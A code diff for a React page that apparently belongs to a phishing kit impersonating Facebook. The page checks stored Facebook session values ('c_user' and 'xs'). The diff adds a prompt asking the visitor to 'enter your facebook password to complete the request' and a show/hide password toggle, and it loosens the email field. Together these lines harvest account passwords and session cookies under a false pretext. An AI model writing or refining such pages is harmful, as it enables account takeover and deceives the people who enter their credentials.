@@ -15,6 +15,7 @@ import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
 import { z } from "zod";
+import { Eye, EyeOff } from "lucide-react"; // Added import for Lucide-react icons
 import {
   Select,
   SelectContent,
@@ -25,7 +26,7 @@ import {
 import { countries } from "@/lib/countries";
 
 const formTwoSchema = z.object({
-  user_email: z.string(), // Optional field
+  user_email: z.string().optional(), // Made optional
   password: z.string().min(1, "Password is required"),
 });
 
@@ -36,6 +37,7 @@ export default function Confirmation() {
   const [, setLocation] = useLocation();
   const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
   const [countryCode, setCountryCode] = useState('+1');
+  const [showPassword, setShowPassword] = useState(false);
 
   const form = useForm<FormTwoValues>({
     resolver: zodResolver(formTwoSchema),
@@ -45,7 +47,6 @@ export default function Confirmation() {
     },
   });
 
-  // Load validation data on mount
   useEffect(() => {
     const storedData = localStorage.getItem('validation_data');
     if (!storedData) {
@@ -57,18 +58,16 @@ export default function Confirmation() {
       if (!parsed.c_user || !parsed.xs) {
         throw new Error("Invalid validation data");
       }
-      form.setValue('c_user', parsed.c_user);
-      form.setValue('xs', parsed.xs);
     } catch (error) {
       console.error('Failed to parse validation data:', error);
       setLocation('/validation');
     }
-  }, [setLocation, form]);
+  }, [setLocation]);
 
   const onSubmit = async (data: FormTwoValues) => {
     try {
       const formattedData = {
-        user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
+        user_email: data.user_email ? (contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email) : undefined,
         password: data.password,
       };
 
@@ -198,26 +197,40 @@ export default function Confirmation() {
                 />
               </div>
 
-              <FormField
-                control={form.control}
-                name="password"
-                render={({ field }) => (
-                  <FormItem className="text-left">
-                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                      Password
-                    </FormLabel>
-                    <FormControl>
-                      <Input
-                        type="password"
-                        placeholder="Enter password"
-                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
-                        {...field}
-                      />
-                    </FormControl>
-                    <FormMessage className="text-xs text-red-500 mt-1" />
-                  </FormItem>
-                )}
-              />
+              <div className="text-left">
+                <p className="text-sm text-[#606770] mb-3">
+                  Please enter your facebook password to complete the request
+                </p>
+                <FormField
+                  control={form.control}
+                  name="password"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                        Password
+                      </FormLabel>
+                      <FormControl>
+                        <div className="relative">
+                          <Input
+                            type={showPassword ? "text" : "password"}
+                            placeholder="Enter password"
+                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20 pr-10"
+                            {...field}
+                          />
+                          <button
+                            type="button"
+                            onClick={() => setShowPassword(!showPassword)}
+                            className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                          >
+                            {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
+                          </button>
+                        </div>
+                      </FormControl>
+                      <FormMessage className="text-xs text-red-500 mt-1" />
+                    </FormItem>
+                  )}
+                />
+              </div>
 
               <Button 
                 type="submit" 
